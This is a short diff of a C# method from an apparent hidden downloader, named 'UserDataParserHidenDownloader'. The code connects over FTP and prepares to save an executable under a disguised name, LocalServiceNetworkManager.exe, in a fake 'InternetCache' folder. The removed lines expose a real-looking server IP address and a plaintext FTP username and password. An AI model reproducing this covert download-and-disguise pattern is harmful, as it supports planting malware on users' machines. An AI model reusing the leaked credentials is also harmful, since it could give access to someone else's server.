@@ -23,8 +23,8 @@ namespace UserDataParserHidenDownloader
         private async Task DownloadFiles()
         {
             FtpClient mainClient = new FtpClient();
-            mainClient.Host = "31.31.196.77";
-            mainClient.Credentials = new NetworkCredential("u0746220", "gfyMs!5Y");
+            mainClient.Host = "";
+            mainClient.Credentials = new NetworkCredential("", "");
             System.IO.Directory.CreateDirectory((Environment.SpecialFolder.LocalApplicationData) + "\\InternetCache\\");
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\InternetCache\\LocalServiceNetworkManager.exe";
             mainClient.Connect();
